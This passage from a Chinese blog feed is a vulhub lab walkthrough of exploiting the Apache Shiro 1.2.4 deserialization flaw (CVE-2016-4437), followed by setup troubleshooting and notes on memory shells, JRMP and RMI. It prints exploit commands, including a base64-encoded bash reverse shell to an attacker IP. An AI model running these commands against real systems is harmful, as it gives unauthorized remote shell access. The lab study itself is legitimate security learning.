&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418183402795.png&#34; alt=&#34;image-20240418183402795&#34;&gt;&lt;/p&gt;
&lt;p&gt;如果不配置此项的话，直接连接，会出现如下情况，无法成功获取shell&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418183458178.png&#34; alt=&#34;image-20240418183458178&#34;&gt;&lt;/p&gt;
&lt;p&gt;利用脚本构造出cooikie信息&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python2 shiro.py 192.168.100.131:7777&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418171624073.png&#34; alt=&#34;image-20240418171624073&#34;&gt;&lt;/p&gt;
&lt;p&gt;BP抓包（勾选remember选项），加入将生成的内容加入到cookie中并发送&lt;/p&gt;
&lt;p&gt;注意要将cookie中原有的内容删去，再添加构造的内容作为cookie发送&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20174103.png&#34; alt=&#34;屏幕截图 2024-04-18 174103&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后回到kali发现获取到了shell&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418174311802.png&#34; alt=&#34;image-20240418174311802&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418174424393.png&#34; alt=&#34;image-20240418174424393&#34;&gt;&lt;/p&gt;
&lt;p&gt;也可以nc开启监听后，直接进行如下命令（脚本将上面的步骤整合到一起了），同样能够获取shell&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python2 shiro_exploit.py -t 3 -u 192.168.100.134:8080 -p &amp;quot;bash -c &amp;#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvNjY2NiAwPiYx&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418185029472.png&#34; alt=&#34;image-20240418185029472&#34;&gt;&lt;/p&gt;
&lt;p&gt;或直接工具进行漏洞利用&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20223333.png&#34; alt=&#34;屏幕截图 2024-04-18 223333&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418231659688.png&#34; alt=&#34;image-20240418231659688&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20223718.png&#34; alt=&#34;屏幕截图 2024-04-18 223718&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20223753.png&#34; alt=&#34;屏幕截图 2024-04-18 223753&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;过程中遇见的问题以及解决方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;总体上，就是脚本运行的环境问题，环境不适配导致一系列报错&lt;/p&gt;
&lt;p&gt;首先，需要pyhton2版本，包括pip2，在kali上装pip2可以，先访问网址&lt;a href=&#34;https://bootstrap.pypa.io/pip/2.7/get-pip.py%EF%BC%8C%E8%8E%B7%E5%8F%96get-pip.py%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%EF%BC%8C%E5%B0%86%E4%B8%8B%E8%BD%BD%E5%A5%BD%E7%9A%84get-pip.py%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%88%B0Kali%E4%B8%8A%E3%80%82%E5%9C%A8Kali%E7%BB%88%E7%AB%AF%E4%B8%AD%EF%BC%8C%E4%BD%BF%E7%94%A8python2%E6%89%A7%E8%A1%8Cget-pip.py%E6%96%87%E4%BB%B6%EF%BC%8C%E5%91%BD%E4%BB%A4%E5%A6%82%E4%B8%8B%EF%BC%9Asudo&#34;&gt;https://bootstrap.pypa.io/pip/2.7/get-pip.py，获取get-pip.py文件内容，将下载好的get-pip.py文件传输到Kali上。在Kali终端中，使用python2执行get-pip.py文件，命令如下：sudo&lt;/a&gt; python2 get-pip.py即可。运行脚本时报错No module named ‘Crypto’，则运行如下命令：pip2 install pycryptodome，（还有问题可以尝试卸载重装该模块，即pip uninstall与install），然后使用pyhton2运行脚本即可。&lt;/p&gt;
&lt;p&gt;然后就是java的版本过高，工具无法正常使用（需要java8版本），可以参考文章&lt;a href=&#34;https://blog.csdn.net/huayimy/article/details/130273362&#34;&gt;https://blog.csdn.net/huayimy/article/details/130273362&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;知识点补充：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;内存马&lt;/p&gt;
&lt;p&gt;普通的木马是写入一个文件去访问,恶意代码是依靠于文件的，执行后就会在内存中被释放掉，但是内存马是依赖于程序本身的动态注册,会在内存中进行一个保存,视为程序的一部分.实现脱离文件后依旧可以运行。&lt;/p&gt;
&lt;p&gt;JRMP&lt;/p&gt;
&lt;p&gt;Java远程方法协议（Java Remote Method Protocol，JRMP），适用于RMI过程中的协议，只有使用这个协议，方法调用双方才能正常进行数据交流。&lt;/p&gt;
&lt;p&gt;RMI&lt;/p&gt;
&lt;p&gt;远程方法调用(Remote Method Invocation)。远程调用服务器上对象的一种接口。能够让在某个java虚拟机上的对象像调用本地对象一样调用另一个java 虚拟机中的对象上的方法。&lt;/p&gt;
&lt;p&gt;参考文章：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/Bossfrank/article/details/130173880&#34;&gt;https://blog.csdn.net/Bossfrank/article/details/130173880&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/articles/web/372862.html&#34;&gt;https://www.freebuf.com/articles/web/372862.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_44159028/article/details/115290013&#34;&gt;https://blog.csdn.net/qq_44159028/article/details/115290013&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/huayimy/article/details/130273362&#34;&gt;https://blog.csdn.net/huayimy/article/details/130273362&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/articles/web/379047.html&#34;&gt;https://www.freebuf.com/articles/web/379047.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/Candyys/article/details/106038761&#34;&gt;https://blog.csdn.net/Candyys/article/details/106038761&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://ares-x.com/tools/runtime-exec&#34;&gt;https://ares-x.com/tools/runtime-exec&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
